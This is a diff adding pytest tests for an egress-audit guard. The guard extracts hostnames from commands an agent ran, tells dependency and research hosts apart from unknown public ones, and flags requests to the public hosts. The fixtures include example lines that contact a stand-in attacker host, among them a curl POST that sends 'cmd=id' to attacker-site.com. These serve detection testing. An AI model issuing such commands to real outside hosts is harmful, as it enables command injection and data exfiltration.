@@ -158,3 +158,60 @@ def test_cleanup_asks_the_janitor_for_the_task_directory(monkeypatch: pytest.Mon
 
 def test_the_probe_is_required_to_run_on_its_own() -> None:
     assert "probe 必须单独执行" in executor.WRITEUP_EXEC_PROMPT
+
+
+# ---------------------------------------------------------------- 出网审计对齐预检(2026-11-23)
+
+def test_a_java_class_path_is_not_a_hostname() -> None:
+    """``java.io.IOException`` 曾被抽成公网主机 ``java.io``, 把一条成功任务判死。"""
+    assert guard.extract_hosts('print("java.io.IOException: boom")') == []
+    assert guard.extract_hosts('{"query": "class java.io.FileNotFoundException"}') == []
+    # 试点的原样: 包路径带通配符(java.io.*), 后面跟的是 "." + "*" 而不是大写字母
+    assert guard.extract_hosts('script="import java.util.*;\\nimport java.io.*;"') == []
+
+
+def test_a_real_url_next_to_a_class_path_still_surfaces() -> None:
+    text = 'raise java.io.IOException\nrequests.get("http://attacker-site.com/x")'
+    assert guard.extract_hosts(text) == ["attacker-site.com"]
+
+
+def test_dependency_and_research_hosts_are_classified_apart() -> None:
+    assert guard.classify_host("old-releases.ubuntu.com") == "dependency"
+    assert guard.classify_host("downloads.mysql.com") == "dependency"
+    assert guard.classify_host("objects.githubusercontent.com") == "dependency"  # 子域
+    assert guard.classify_host("nvd.nist.gov") == "research"
+    assert guard.classify_host("docs.python.org") == "research"
+    assert guard.classify_host("attacker-site.com") == "public"
+
+
+def test_fetching_a_distro_mirror_is_not_an_attack() -> None:
+    """``curl -I`` 探发行版镜像 —— 试点里被判成"打了公网"(task 27)。"""
+    commands = [{"cmd": "curl -sI --max-time 10 http://old-releases.ubuntu.com/ubuntu/ | head -3", "exit_code": 0}]
+    out = guard.audit_egress(commands, {})
+    assert out["review_required"] is False
+    assert out["external_requests"] == []
+    assert "old-releases.ubuntu.com" in out["allowed_sources"]
+
+
+def test_looking_up_a_cve_is_not_an_attack() -> None:
+    commands = [{"cmd": 'curl -s --max-time 40 "https://nvd.nist.gov/vuln/detail/CVE-2024-4577"', "exit_code": 0}]
+    assert guard.audit_egress(commands, {})["review_required"] is False
+
+
+def test_posting_to_an_unknown_public_host_still_blocks() -> None:
+    commands = [{"cmd": "curl -X POST http://attacker-site.com/api -d 'cmd=id'", "exit_code": 0}]
+    out = guard.audit_egress(commands, {})
+    assert out["review_required"] is True
+    assert "attacker-site.com" in out["external_requests"]
+
+
+def test_a_local_request_with_a_dotted_class_in_the_body_is_clean() -> None:
+    """task 26 的原样: 打 127.0.0.1, 但请求体里带 ``java.io``。"""
+    commands = [{
+        "cmd": "curl -s -m 15 -XGET --get 'http://127.0.0.1:8101/_search' "
+               "--data-urlencode 'source={\"query\":{\"match\":{\"msg\":\"java.io.IOException\"}}}'",
+        "exit_code": 0,
+    }]
+    out = guard.audit_egress(commands, {})
+    assert out["review_required"] is False
+    assert "java.io" not in out["domains_accessed"]
